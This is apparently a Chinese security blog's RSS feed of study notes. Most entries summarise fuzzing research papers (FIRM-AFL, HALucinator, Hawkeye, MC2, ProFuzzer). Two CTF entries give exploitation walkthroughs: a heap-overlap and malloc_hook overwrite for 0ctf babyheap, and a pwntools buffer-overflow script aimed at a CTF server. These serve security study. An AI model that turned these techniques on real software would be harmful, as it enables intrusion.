作者题目中提到的高通量在文章体现为仿真器的高吞吐量。什么意思呢，就是说固件需要仿真运行在仿真器中，模糊测试喂给固件大量测试用例，但是目前的仿真手段对于喂给的测试用例执行的很慢，1 秒可能只执行 1 个或几个测试用例，即吞吐量小，作者实现的 FIRM-AFL 吞吐量很高。
摘要 FIRM-AFL 是第一个针对物联网固件的高通量的灰盒模糊测试器 解决了兼容性问题——对可以在系统仿真器仿真的 POSIX 兼容固件进行模糊测试 解决了性能瓶颈——增强进程模拟的新技术 增强型进程仿真以一种新颖的方式将系统模式仿真和用户模式仿真结合起来，提供了系统模式仿真的高兼容性和用户模式仿真的高吞吐量。 看来本篇文章的主要工作在于这个增强进程仿真技术 引言 吞吐量是影响模糊效果的关键因素。根据文章的实验，全系统仿真比用户模式仿真 (AFL 使用的用户模式仿真) 慢大约 10 倍。10 倍的减速意味着在物联网程序中查找漏洞所需的计算资源大约是桌面程序的 10 倍。 全系统仿真的巨大运行时开销的一部分来自内存管理单元 (即 SoftMMU) 的软件实现，用于将虚拟机中发生的每一次内存访问的客户虚拟地址转换为主机虚拟地址。开销的另一部分来自系统调用模拟开销。 我们的解决方案：通过增强过程仿真进行灰盒模糊测试。 优势在于透明度和效率 透明度，即不需要对固件中的程序进行修改， 效率，即整个系统的模糊吞吐量应该接近用户模式仿真。 关键在于将全系统仿真和用户模式仿真相结合，得到了全系统仿真的通用性和用户模式仿真的效率。 主要是通过系统仿真来加强进程（或者说用户模式）的仿真。具体来说是被测程序主要运行在用户态的仿真以达到高效的目的，只有在必要时切换到全系统仿真，以保证程序的正确执行，从而实现通用性。 FIRM-AFL 基于 AFL 和 Firmadyne 实现，AFL 负责覆盖引导模糊测试，Firmadyne 负责仿真和全系统仿真与用户态仿真之间的切换 背景和动机 Fuzzing 和 qemu 跳过，没啥意思
测试物联网固件 挑战 兼容性 代码覆盖率：黑盒模糊器的代码覆盖率很低，而白盒模糊器不能扩展到略大的代码库 同类型工具对比 Avatar：协调模拟器和物理硬件，Avatar 充当模拟器和实际硬件之间的软件代理。 由于涉及到白盒模糊和缓慢的硬件，Avatar 的吞吐量预计会很低。 IoTFuzzer：直接对设备进行黑盒测试，它的主要优点是通过目标设备的配套移动应用程序执行模糊。 IoTFuzzer 从未超过每秒 1 个测试用例的吞吐量，这是缓慢的 Firmadyne：在系统模式 QEMU 中增加了对 IoT 固件的硬件支持，通过修改内核和驱动程序来完全模拟系统，以处理由于缺乏实际硬件而导致的物联网异常。更容易适应新的 IOT 固件。 全系统模拟的吞吐量通常比本机执行（本机执行是指直接向硬件发送输入）好 AFL：AFL 可以通过 qemu 进行二进制模糊，但是无法成功模拟大多数物联网程序。 Muench 等人[28]的研究表示相比较于部分仿真和本机执行，完全仿真拥有最大的吞吐量。 因为物联网设备处理器要比桌面级处理器慢的多，所以你一旦涉及到真实硬件，速度就会被物联网设备处理器拖慢，所以基于桌面级处理器的全仿真要快得多 作者在这里的评价标准聚焦于吞吐量，不太明白这个吞吐量是啥，应该就是指设备接收测试用例的速度吧 动机 固件大多是二进制文件，基于仿真是最佳的 完全仿真吞吐量要高于其他仿真方法 吞吐量的瓶颈所在：</description>
    </item>
    
    <item>
      <title>fuzz待读</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/1.%E5%8E%9F%E6%96%87/%E5%BE%85%E8%AF%BB/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/1.%E5%8E%9F%E6%96%87/%E5%BE%85%E8%AF%BB/</guid>
      <description>(84条消息) 一个网安博士生的收藏夹_fuzzwiki_破落之实的博客-CSDN博客 2023-06-22 15:53
The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing 的阅读笔记 https://zhuanlan.zhihu.com/p/415316061 What You Corrupt Is Not What You Crash_ Challenges in Fuzzing Embedded Devices 的笔记 http://www.hackdig.com/09/hack-487712.htm 针对 UAF 类漏洞的定向 Fuzz 论文分享 http://www.hackdig.com/08/hack-442272.htm Binary-level Directed Fuzzing for Use-After-Free Vulnerabilities（论文名字） 物联网固件安全缺陷检测研究进展 (2022 年) 物联网固件安全缺陷检测研究进展-Research Progress on Security Defect Detection of IoT Firmware (iie.ac.cn) ![[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices#^eea5b5]] [[What You Corrupt Is Not What You Crash_ Challenges in Fuzzing Embedded Devices.</description>
    </item>
    
    <item>
      <title>fuzz整理</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/fuzz%E6%95%B4%E7%90%86/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/fuzz%E6%95%B4%E7%90%86/</guid>
      <description>#TODO [[SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits]]
变异策略分为粗细粒度 粗粒度：将每次的输入称之为模糊实例，测量模糊实例和脆弱函数之间的距离（距离是两者之间最短路径的节点数），距离越小的输入作为新种子的优先级越高 粗粒度主要修改的是系统调用序列 细粒度：和粗粒度差不多，但是距离是两个基本块之间的距离 细粒度主要修改的是参数值 [[BEACON Directed Grey-Box Fuzzing with Provable Path Pruning]]
本文提供了一个符号执行求解条件在fuzz应用上的一个折中的方法。从脆弱函数向上一直到入口函数，把条件积累。不去算符号的值，而是去算符号值的范围。这样就可以将很大一批随机变异得到的输入给排除掉。 [[ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery]]
和semfuzz一样来自游伟老师 本文的点在于可以自动的探测被fuzz对象的输入格式（可能还到不了输入格式这个程度），依据反馈将相同反馈的字节连接形成字段，并且识别字段的类型（作者自己定义了几个类型）。然后再进行fuzz。 好处在于字节连接成字段后，可以有效的进行变异，就减少那些根本输入都输入不了的输入实例。提高fuzz效率。 [[Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing]]
作者认为智能电视的安卓操作系统中有很多厂商自定义添加的API，这种API存在漏洞的风险比较高，作者专注于fuzz这种API 作者首先定位API 然后对API fuzz，收集日志信息 首先过滤和目标API无关的日志信息 然后通过一个训练好的分类器来识别过滤后的日志信息中哪些和输入验证相关 [[SeededFuzz Selecting and Generating Seeds for Directed Fuzzing]] [[Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators]]
这篇文章的fuzz对象是驱动，作者认为不需要设备的驱动fuzz关键在于通过驱动的验证链 [[Hawkeye： Towards a Desired Directed Grey-box Fuzzer]]</description>
    </item>
    
    <item>
      <title>HALucinator Firmware Re-hosting Through Abstraction Layer Emulation</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/halucinator-firmware-re-hosting-through-abstraction-layer-emulation/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/halucinator-firmware-re-hosting-through-abstraction-layer-emulation/</guid>
      <description>中文译名：HALucinator: 通过抽象层仿真重新托管固件 作者：Abraham A. Clements 单位：桑迪亚国家实验室 国家： #美国 年份： #2020年 来源： #USENIX会议 关键字： #固件 #仿真托管 代码地址： 笔记建立时间： 2023-03-04 10:29
摘要 背景：硬件和固件之间的紧密耦合以及嵌入式系统中的多样性使得对固件进行动态分析变得困难。 现状：固件开发人员经常使用抽象，如硬件抽象层（HAL），来简化他们的工作。 方法：利用这些抽象作为重新托管和分析固件的基础。通过为 HAL 函数提供高级替代（一个称为高级模拟 - HLE 的过程），将硬件和固件分离。首先通过二进制分析定位固件样本中的库函数，然后在全系统模拟器中提供这些函数的通用实现。 工作：对现有库匹配技术进行扩展，可以识别二进制固件中的库函数；使用简化处理程序喝外设模型来进行 re-hosting；集成到 AFL 来演示安全分析方面的应用
1引言 背景： 固件动态分析难
固件有硬件依赖性，传统的手段不好实施 嵌入式硬件提供有限的内省能力，包括极其有限数量的断点和监视点，大大限制了对固件进行动态分析的能力。 没有源代码，并且固件难以获得，即使得到固件也难以处理复杂的环境依赖 模拟具有局限性：
嵌入式硬件中的异构性对固件模拟构成了重大障碍，模拟需要对片上外设和内存布局以专门方式支持 流行的开源 QEMU 模拟器支持不到 30 种 ARM 设备 英特尔的 SIMICS [38, 57]支持许多 CPU 和外设，但要求分析师手动构建硬件级别的完整系统模型。 大多数嵌入式系统还需要其他硬件组件才可能使固件运行（如传感器、存储设备或网络组件），然而这些外设几乎没有模拟支持 现状：
模拟器将固件与不受支持的外设的交互转发的真实设备上 受硬件可用的限制 分析和插桩受限 记录并重放或建模来自硬件的数据 上述问题同样困扰固件开发人员 芯片供应商和各种第三方提供了硬件抽象层 HAL。HAL 是软件库，为程序员提供高级硬件操作，同时隐藏固件执行所在特定芯片或系统的细节。 方法： 通过使用高级抽象层和可重用的替换功能来实现嵌入式系统的可扩展模拟，称为高级模拟 (HLE)
首先识别固件映像中负责硬件交互的 HAL 函数 然后 HLE 提供简单的、分析师创建的高级替换（称之为处理程序）替换 HAL 函数， 这种替换可以扩展到来自同一供应商的芯片，甚至扩展到使用相同中间件库的固件 这些处理程序可以使用外设模型，它们作为硬件外设通用类别的抽象，并在模拟环境和主机环境之间作为交互点，而无需复杂逻辑。 贡献：</description>
    </item>
    
    <item>
      <title>Hawkeye： Towards a Desired Directed Grey-box Fuzzer</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/hawkeye-towards-a-desired-directed-grey-box-fuzzer/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/hawkeye-towards-a-desired-directed-grey-box-fuzzer/</guid>
      <description>中文译名：hawkeye: 需求导向的灰盒模糊测试 作者：Hongxu Chen 单位：南洋理工大学 国家： #新加坡 年份： #2018年 来源： #ccs 关键字： #定向fuzzing #fuzzing #灰盒 代码地址： https://github.com/hongxuchen/Hawkeye 介绍网站：Hawkeye (google.com) 笔记建立时间： 2023-02-28 09:30
摘要 目的：提高灰盒模糊器的指向性 方法：静态分析收集信息（调用图、函数和基本块级别的目标距离）；基于静态信息和执行跟踪评估执行的种子，生成动态指标，用于种子优先级、能量分配和自适应变异 创新：新颖的静态分析、动态指标生成 效果：相比于 AFL 和 AFLGo 等最先进的灰盒模糊测试器，Hawkeye 可以更快地到达目标站点并重现崩溃。特别是，Hawkeye 可以将暴露某些漏洞的时间从约 3.5 小时缩短至 0.5 小时。
1引言 在静态分析提取信息后，动态分析中有几个挑战——如何动态调整不同策略，以便尽快到达目标站点。第一个挑战是如何正确分配能量给不同距离的输入，以及如何优先考虑离目标更近的输入。这推导出第三个期望属性P3。第二个挑战是如何适应性地改变变异策略，因为GFs可能在粗粒度（例如批量删除）和细粒度（例如按位翻转）两个层次上拥有各种变异操作符。这推导出第四个期望属性P4。因此，第二个问题是对DGF中使用的动态策略进行适当调整。
背景： 在一些测试场景下需要定向 fuzzing 漏洞重现 在一个平台上发现了漏洞，那么在其他类似平台是否有相似漏洞 测试补丁 最先进（2018 年前）的定向灰盒 fuzzer 是 AFLGO AFLGo 将到达目标站点的可达性视为一种优化问题，并采用元启发式方法来促进具有更短距离的测试种子。这里，距离是根据输入种子的执行跟踪中到目标基本块的平均基本块权重计算的，其中权重由程序的调用图和控制流图中的边决定，元启发式方法为模拟退火。 挑战： 拥有一个合适的静态分析来收集 DGF 所需信息。 如何有效的计算到 target sites 的有效距离而不损害有些期望特征，特别地，它应该有助于保留种子多样性 AFLGO 优先分配能量给距离 target sites 最短的种子，但是这样反而会导致饿死那些更快触发漏洞的种子。（因为计算方法的问题，可能算出来的最短距离并不是直观上的最短距离）（这个貌似在 MC2 中有提及，等我去翻翻） LibFuzzer 认为不考虑所有的路径可能会漏掉隐藏在较长路径深处的错误 如何减小静态分析的开销 对 DGF 中使用的动态策略进行适当调整 如何分配能量 如何适应性（动态）的调整变异策略 目的： 基于以上的挑战，作者总结了 DGF 应该有的四个属性（摘要里提到的那个 feature） P1 DGF 应该具有一个基于距离的强大机制，能够通过考虑所有到目标的轨迹并避免对某些轨迹的偏见来指导定向模糊测试。 P2 DGF 应该在静态分析中平衡开销和效用。 P3 DGF 应该优先安排种子以快速到达目标站点。 P4 当种子覆盖不同程序状态时，DGF 应采用自适应变异策略。 方法： 对于 P1，使用基于增强的相邻函数距离来计算函数级距离和基本块距离，同时在模糊测试中将静态分析结果和运行时执行信息结合，计算执行轨迹和 target sites 基本块轨迹距离和覆盖函数相似度。（说白了就是动静结合） 对于 P2，应用基于调用图（CG）和控制流图（CFG）的分析，即函数级可达性分析、函数指针（间接调用）的指向分析和基本块度量（§4.</description>
    </item>
    
    <item>
      <title>ideal</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/ideal/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/ideal/</guid>
      <description> 2023年5月15日 ^407193 对于semfuzz可以从两个方面进行改进 首先是信息提取，semfuzz是采用将信息构建成语法树，然后基于作者的规则从语法树中选择信息，这部分可以改成神经网络，为什么呢，因为semfuzz虽然说是语义级别的提取，但是总觉得有点粗暴生硬，改成神经网络或许可以得到一些隐式的信息，增强语义上的获取。 然后是在fuzz部分，semfuzz或者大多数定向fuzz的方法是计算测试用例的距离，距离越近越好。但是尝试去修剪到不了target的路径呢（参考 [[BEACON Directed Grey-Box Fuzzing with Provable Path Pruning]]） 定向 fuzz 解决定制缺陷，因为定制缺陷是指用户根据自己和环境需要对固件进行一定的修改, 这一缺陷的检测无需对整个固件进行测试, 可以将测试重点放在被修改及相关部分，恰恰符合定向 fuzz 的特点 [[物联网固件安全缺陷检测研究进展#^6e21ca]] </description>
    </item>
    
    <item>
      <title>𝑀𝐶2 Rigorous and Efficient Directed Greybox Fuzzing</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%F0%9D%91%80%F0%9D%90%B62-rigorous-and-efficient-directed-greybox-fuzzing/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%F0%9D%91%80%F0%9D%90%B62-rigorous-and-efficient-directed-greybox-fuzzing/</guid>
      <description>MC2 : 严格而高效的定向灰盒模糊法
abstract 背景：most existing directed greybox fuzzers do not provied any theoretical analysis of their performence or optimality.大多数现有的有向灰盒模糊器都没有对其性能或最优性提供任何理论分析。
方法：
引入了一个复杂性理论框架，将灰盒模糊作为先知引导的搜索问题，通过查询oracle来接收关于输入空间的反馈。使用模糊算法寻找目标达到输入所需的oracle查询数量作为性能指标。 基于框架，设计了一个随机有向灰盒模糊算法 成果：在具有挑战性的基准测试(Magma和Fuzzer测试套件)中比最先进的定向灰盒模糊器的性能平均高出两个数量级(即134×)。MC2还发现了15个以前未被发现的bug，这是其他最先进的定向灰盒模糊器无法发现的
introduction 背景：有向灰盒模糊是一种流行的具有针对性的软件测试技术，当给定程序中的一组目标站点，定向灰盒模糊器自动搜索程序的输入空间，以寻找到达目标的输入。但由于现实世界程序的输入空间非常大，大多数现有的有向灰盒模糊器使用进化算法，将其搜索集中在通过工具化程序执行使用反馈信息确定的有希望的输入区域。（比如模糊器经常收集关于控制流图距离或与目标的分支约束距离的反馈信息，并优先处理接近目标的变异输入）
问题：现有的有向模糊器没有提供任何关于其性能的理论分析。没有严格的理论理解，就很难理解模糊器设计的关键指导原则。（作者提出了几个示例问题：什么是最好的（即最优的）定向模糊器？模糊算法随着输入空间大小的变化而变化的程度如何？什么样的反馈信息对模糊处理最有用？一个算法如何才能最好地利用反馈？在使用这种反馈信息方面，能否比进化算法做得更好？）
工作：
复杂理论框架：将关于仪器和模糊算法类型的具体细节抽象到一个统一的框架中。我们将有向灰盒模糊处理的任务建模为一个甲骨文引导的搜索问题：找到到达目标的输入，给定查询访问执行程序的甲骨文，并向模糊处理算法揭示一些关于搜索空间的信息（即有希望的输入区域的身份）。 执行的复杂性：引入了执行复杂度的概念，这是一个渐近度量框架中任何模糊算法的性能的指标。其值是根据模糊器在找到到达目标站点的输入之前进行的oracle查询的数量。 一个最佳的模糊算法：引入了一种特殊类型的甲骨文，称为噪声计数甲骨文。基于噪声计数甲骨文和分析框架设计了一个模糊算法 用蒙特卡洛进行近似计数：我们开发了一种蒙特卡洛算法，用于实现我们的随机定向灰盒模糊算法，但是作者指出这样容易把到达目标数估计成零，因为在实践中，大多数模糊目标点只能由满足一个或多个分支约束的少量输入到达。所以为了克服这个问题，作者认为即使没有找到达到目标的少数输入，我们仍然可以以高置信度计算出一个计数的上界。（不太懂） 浓度范围。可以使用浓度界来推导满足分支约束的可能性的上界 沿着多个分支进行计数。对于任何给定的到达目标的路径，我们近似地计算满足上述路径中每个分支的输入数量，并将它们结合起来，得到到达目标的输入数量的估计值。 讲实话，读完引言感觉这篇有点抽象啊。
methodology 本节作者提出一个通用复杂理论框架用于在oracle引导搜索问题中推论最好的定向灰盒模糊器。 然后用这个框架搞一个噪声计数oracle，用这个oracle建立一个优化的定向灰盒模糊器。 2.1 terminology and notation 目标程序为P 在模糊处理过程中要探索的大而有限的输入空间表示为I input region：是输入空间I的子集。 pai：表示CFG中的一条有穷路径 P(i)：输入为i的程序P的执行结果 2.2 A framework for directed greybox fuzzing 在这一节中，我们引入了一个复杂性理论框架来推理最佳模糊器在目标程序执行数量方面的性能下限
fuzzing as oracle-guided search 该框架允许模糊器通过查询一个甲骨文来学习关于任何有界输入区域I的信息。 假设每个Oracle查询最多可以提供一个给定输入区域的c个比特的信息 该框架不做假设，没有任何关于程序的先验知识 problem definition 将有向灰盒模糊器处理的任务定义为一个Oracle引导的搜索问题：在给定访问程序，控制流图，输入空间，目标边和Oracle询问，模糊算法必须能找到一个输入能够让该输入对应的路径达到目标边。 execution complexity 这个是为了衡量模糊器的性能，定义的一个指标值。在找到达到目标的输入之前需要的甲骨文查询数量。（甲骨文查询的数量直接映射到程序的执行数量，这句话是不是可以理解未查询数就是程序的执行数）
这里也指出了本文框架的目的，计算测试fuzzer的execution complexity，试图找到execution complexity的下界（最小值），即f找到达到目标的输入之前需要的最小甲骨文查询数量，用这个指标衡量fuzzer性能。</description>
    </item>
    
    <item>
      <title>overlapping heap（以0ctf babyheap为例）</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/overlapping-heap%E4%BB%A50ctf-babyheap%E4%B8%BA%E4%BE%8B/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/overlapping-heap%E4%BB%A50ctf-babyheap%E4%B8%BA%E4%BE%8B/</guid>
      <description>(68条消息) [pwn]堆：fastbin attack 详解_breezeO_o 的博客-CSDN 博客 (68条消息) [BUUCTF]PWN——babyheap_0ctf_2017_Angel~Yan 的博客-CSDN 博客 【学习分享】babyheap_0ctf_2017，一道入门堆的题 这个视频非常详细，非常好
（主要是对上面两个 writeup 的补充和思路的整理） 这道题主要分为两个步骤
泄露 libc 地址 修改 malloc_hook 为 onegadget 为什么我们需要泄露 libc 地址呢，因为我们需要知道 malloc_hook 的地址。而 malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过将 mall_hook 指向一个 onegadget 来 getshell。
泄露 libc 首先我们申请四个 chunk，编号 0、1、2、3。（实际大小应该还加上 presize 的 8 个字节）
alloc(0x18) #0 alloc(0x68) #1 alloc(0x68) #2 alloc(0x18) #3 然后，我们通过溢出 0 号 chunk 来修改 1 号 chunk 的大小（因为 1 号 chunk 的指针指不到自己的 size 的位置），将其修改为 chunk 1+chunk2 的大小。 然后 free (1)，因为此时 1 号 chunk 的大小是 0xe0，所以会放到 unsortbin 链表。 我们为啥要让 1 和 2 chunk 作为一个 chunk 释放呢。因为 unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址 (unsorted bin 链表的头部），这个地址为 main_arena + 0 x 58 ，而且 main_arena 又相对 libc 固定偏移 0 x3c4b20 ，所以得到这个 fd 的值，然后减去 0 x 58 再减去 main_arena 相对于 libc 的固定偏移，即得到 libc 的基地址。 所以我们要想方设法得到这个 fd 的值，但是我们对 chunk 释放后，指针也就失效了，读不到此时挂在 unsortbin 链表上 chunk 的内容。 所以我们让 chunk 1 和 2 堆叠释放，此时 unsortbin 链表上挂了一个大小为 0xe0 的 chunk，然后我们 alloc (0x68)，此时系统会将0xe0 的 chunk 分割，将0x68 分配，而剩下的0x68 大小的 chunk 就是我们之前 alloc 的 chunk 2，此时我们将 chunk 2 打印便可以得到 fd，也就得到 libc 的基址。</description>
    </item>
    
    <item>
      <title>Poster Automated Discovery of Sensor Spoofing Attacks on Robotic Vehicles</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/poster-automated-discovery-of-sensor-spoofing-attacks-on-robotic-vehicles/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/poster-automated-discovery-of-sensor-spoofing-attacks-on-robotic-vehicles/</guid>
      <description>Poste：机器人车辆传感器欺骗攻击的自动发现
摘要 在本文中，我们提出了一个新的传感器模糊框架SensorFuzz，它可以系统地发现机器人车辆上潜在的传感器欺骗攻击。它通过正式模拟现有的传感器攻击和利用高保真车辆模拟来产生恶意的传感器输入，然后用基于弹性的反馈机制分析输入对车辆的影响。
introduction 研究背景:
现在有很多针对RV（robotic vehicles）的攻击； 发现RV的未知攻击并进行防御具有挑战性，因为 传感器输入值具有巨大和动态的范围 实验昂贵耗时 研究内容：
开发了一个反馈驱动的模糊器SensorFuzz 生成真实的传感器欺骗输入 基于一个高保真的环内软件模拟器 通过突变模型来减少误报 监控系统内部状态，测量RV对攻击的弹性，弹性评分作为反馈。 MOTIVATION AND CHALLENGES Large input space：输入空间极其巨大，但是大量的输入其实在现实生活中不会出现，所以利用传感器和相关攻击的语义引导的模糊分析将促进攻击发现的过程。
Fuzzing feedback：fuzz测试的feedback选择什么指标是个挑战。
DESIGN 首先，在模拟器中，我们对产生模拟器输入的函数进行检测，以检索原始的传感器值，并注入由SensorFuzz变异的传感器值。第二，由控制系统产生的控制状态日志被用来实时计算RV对变异值的弹性。然后，弹性被用作反馈，以帮助生成下一个输入。第三，GCS的任务状态被用来检测任务失败。
传感器输入变异 利用现有传感器攻击公式（这个公式就是关于振幅，频率，相位的公式，因为传感器输入的值就是这些），开发了突变模型（其实也是个关于振幅频率相位的公式）。
基于弹性的反馈机制 给出了弹性分数的计算公式和突变模型的选择策略。
我的评价 这篇论文只是把fuzz的思想移植到RV的漏洞检测上，可能这块做的人比较少。创新点在于传感器输入变异公式和弹性衡量公式，但是还是处在一个建模的阶段，不算很难。</description>
    </item>
    
    <item>
      <title>ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/profuzzer-on-the-fly-input-type-probing-for-better-zero-day-vulnerability-discovery/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/profuzzer-on-the-fly-input-type-probing-for-better-zero-day-vulnerability-discovery/</guid>
      <description>文译名：profuzzer：实时输入类型探测，以更好地发现零日漏洞 作者：游伟 单位：普顿大学 国家： #美国 年份： #2019年 来源： #SP 关键字： #fuzzing 代码地址： 笔记建立时间： 2023-04-26 09:31
abstract 实时的探测技术。可以自动的发现和理解关键 fields，并且自动调节变异策略 用单个字节变异，然后自动分析其 fuzz 结果，将相关字节连接在一起，并识别连接后的字段类型，依据该类型的变异策略来进一步变异。 introduction changes most of input based grammar mutation lead to the same execution path and therefore only one of the should be tested futhermore, maybe inputs that exploit vulnerabilities not follow the grammar random mutation has large input space fuzzing the type probing propose a novel technology called profuzzer which has two stages:</description>
    </item>
    
    <item>
      <title>PWN格式化字符串漏洞</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</guid>
      <description>![[刷题#2023.2.9 JarvisOJ fm]]</description>
    </item>
    
    <item>
      <title>PWN简单题题解</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/</guid>
      <description>picoctf_2018_buffer overflow 2 from pwn import * from LibcSearcher import* # context(arch = &amp;#39;amd64&amp;#39;, os = &amp;#39;linux&amp;#39;, log_level = &amp;#39;debug&amp;#39;) context.log_level = &amp;#39;debug&amp;#39; elf = ELF(&amp;#39;./bin/PicoCTF_2018_buffer_overflow_2&amp;#39;) p = remote(&amp;#39;node4.buuoj.cn&amp;#39;, 28842) # elf win = elf.symbols[&amp;#39;win&amp;#39;] main_addr = elf.symbols[&amp;#39;main&amp;#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b&amp;#39;a&amp;#39; * 0x6c + p32(0) + p32(win) + p32(main_addr) + p32(a1) + p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory 这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag
from pwn import * from LibcSearcher import* # context(arch = &amp;#39;amd64&amp;#39;, os = &amp;#39;linux&amp;#39;, log_level = &amp;#39;debug&amp;#39;) context.</description>
    </item>
    
    <item>
      <title>pwn细碎知识</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E7%BB%86%E7%A2%8E%E7%9F%A5%E8%AF%86/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E7%BB%86%E7%A2%8E%E7%9F%A5%E8%AF%86/</guid>
      <description>「二进制安全pwn基础」 - 网安
